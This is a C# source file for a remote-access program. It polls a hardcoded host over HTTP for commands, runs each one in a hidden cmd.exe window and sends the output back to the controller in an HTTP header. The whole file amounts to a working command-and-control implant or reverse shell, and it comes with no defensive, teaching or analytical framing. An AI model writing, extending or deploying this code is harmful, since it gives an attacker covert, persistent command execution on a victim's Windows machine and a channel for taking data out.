using System;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Web;

namespace Remote_Access_Command_Line_Interface
{

    public static partial class Extensions
    {
        /// <summary>
        ///     Encodes a URL string.
        /// </summary>
        /// <param name="str">The text to encode.</param>
        /// <returns>An encoded string.</returns>
        public static String UrlEncode(this String str)
        {
            return HttpUtility.UrlEncode(str);
        }

        /// <summary>
        ///     Encodes a URL string using the specified encoding object.
        /// </summary>
        /// <param name="str">The text to encode.</param>
        /// <param name="e">The  object that specifies the encoding scheme.</param>
        /// <returns>An encoded string.</returns>
        public static String UrlEncode(this String str, Encoding e)
        {
            return HttpUtility.UrlEncode(str, e);
        }
    }

    class Program
    {


        static async Task Main(string[] args)
        {
            string ip_address = "192.168.1.64";
            int port = 80;
            int current_command = 0;
            while (true)
            {
                using var client = new HttpClient();

                var result = await client.GetStringAsync("http://" + ip_address +':' + port.ToString());
                Console.Clear();
                int command_no = int.Parse(result.Substring(result.Length - 1, 1));
                if (current_command != command_no)
                {
                    Console.WriteLine(result);
                    string command_res = execute_command(result.Substring(0, result.Length - 1));
                    var output = command_res.UrlEncode();
                    Console.WriteLine(output);
                    client.DefaultRequestHeaders.Add("command", output);
                    
                    await client.GetStringAsync("http://" + ip_address + ':' + port.ToString() + '/');
                    current_command = command_no;
                }

            }
        }



        public static string execute_command(string command)
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine(command);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            string ret_val = cmd.StandardOutput.ReadToEnd();
            cmd.Dispose();
            return ret_val;
        }
    }
}
